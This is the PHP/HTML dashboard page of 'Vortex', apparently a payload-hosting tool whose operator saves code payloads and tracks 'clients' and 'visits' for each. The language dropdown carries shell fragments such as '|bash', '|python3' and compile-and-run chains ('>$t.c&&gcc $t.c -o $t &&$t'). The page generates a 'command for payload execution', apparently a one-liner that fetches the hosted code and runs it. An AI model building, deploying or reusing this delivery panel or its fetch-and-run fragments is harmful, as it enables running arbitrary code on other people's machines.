<?php
require_once("protection.php");
?>

<!DOCTYPE html>
<html>
    <head>
        <title>Vortex | DashBoard </title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="icon" type="image/png" href="http://icons.iconarchive.com/icons/artcore-illustrations/artcore-4/512/terminal-icon.png"/>
        <script src="static/javascript/jquery.js"></script>
        <link href="static/css/materialize.css" rel="stylesheet">
        <link href="static/css/main.css" rel="stylesheet">
        <script src="static/javascript/materialize.js"></script>
        <script src="static/javascript/main.js"></script>
    </head>
    <body onload="listPayload();">

    <!-- DESKTOP NAVBAR -->
        <nav class="black desktop-nav">
            <div class="nav-wrapper">
                <a href="#" class="brand-logo">Vortex</a>
        
                <a href="#" class="sidenav-trigger" data-target="mobile-nav">
                    <i class="material-icons">menu</i>
                </a>
        
                <ul class="right hide-on-med-and-down "  >
                    <li><a href="#" onclick="$('.createPayloadBlock').toggle(450);"><span class="material-icons">add_box</span> Create payload</a></li>
                    <li><a href="#" onclick="$('.managePayloadBlock').toggle(450);"><span class="material-icons">create</span> Manage payloads</a></li>
                    <li><a href="https://github.com/LimerBoy"><span class="material-icons">live_help</span> About</a></li>
                </ul>
            </div>
        </nav>

    <!-- MOBILE NAVBAR -->
        <ul class="sidenav" id="mobile-nav">
            <li><a href="#" onclick="$('.createPayloadBlock').toggle(450);"><span class="material-icons">add_box</span> Create payload</a></li>
            <li><a href="#" onclick="$('.managePayloadBlock').toggle(450);"><span class="material-icons">create</span> Manage payloads</a></li>
            <li><a href="https://github.com/LimerBoy"><span class="material-icons">live_help</span> About</a></li>
        </ul>

        
    <!-- CREATE PAYLOAD -->
        <div style="margin-top: 10%;">
            <div class="row createPayloadBlock z-depth-5 hoverable">

                <!-- SELECT PAYLOAD LANGUAGE -->
                <div class="input-field col s6">
                    <select id="createPayloadLanguage">
                        <option lang="" value="" disabled selected>Choose language</option>
                        <option lang="bash" value="|bash">Bash</option>
                        <option value="|python2">Python2</option>
                        <option value="|python3">Python3</option>
                        <option value="|ruby">Ruby</option>
                        <option value="|lua">Lua</option>
                        <option value=">$t.pl&&perl $t.pl">Perl</option>
                        <option value=">$t.go&&go run $t.go">Golang</option>
                        <option value=">$t.cpp&&g++ $t.cpp -o $t &&$t">C++</option>
                        <option value=">$t.c&&gcc $t.c -o $t &&$t">C</option>
                        <option value=">$t.htm&&firefox $t.htm">HTML</option>
                    </select>       
                    <label>Select language</label>
                </div>

                <!-- INPUT PAYLOAD NAME -->
                <div class="input-field col s6">
                    <input id="createPayloadName" type="text">
                    <label for="createPayloadName">Enter payload name here:</label>
                </div>

                <!-- TEXTAREA FOR PAYLOAD CODE -->
                <div class="row col s12">
                    <div class="input-field">
                        <textarea id="createPayloadCode" class="materialize-textarea"></textarea>
                        <label for="createPayloadCode">Enter payload code here:</label>
                    </div>
                </div>

                <!-- SAVE PAYLOAD BUTTON -->
                <div class="col s12">
                    <a class="tooltipped waves-effect btn-large pulse black right z-depth-4" data-position="bottom" data-tooltip="Click to create payload and save it on server." onclick="createPayload();"><span class="material-icons">save</span> Save payload</a>
                </div>

            </div>
        </div>

    <!-- MANAGE PAYLOADS (TABLE) -->
    <div style="margin-top: 2%;">
        <div class="row managePayloadBlock hoverable">
        <table class="listPayloadTable centered highlight">
            <thead>
            <tr>
                <th><span class="material-icons">fingerprint</span> Name</th>
                <th><span class="material-icons">pie_chart</span> Clients</th>
                <th><span class="material-icons">history</span> Visits</th>
                <th><span class="material-icons">build</span> Options</th>
            </tr>
            </thead>

            <tbody>
            </tbody>
        </table>

        </div>
    </div>

    <!-- PAYLOAD CREATE MODAL -->
    <div id="modalPayload" class="modal">
        <div class="modal-content">
            <h4 class="modalPayloadInfo centered"></h4>

            <div class="input-field col s6" style="margin-top: 8%;" onclick="copyPayloadCommand();">
                <input id="modalPayloadCommand" type="text">
                <label for="modalPayloadCommand">Command for payload execution</label>
            </div>

        </div>
        <div class="modal-footer">
            <a href="#" class="modal-close waves-effect waves-red btn-flat"><span class="material-icons">close</span> Close</a>
        </div>
    </div>

    <!-- BACKGROUND -->
    <div id="background"></div>

    </body>
</html>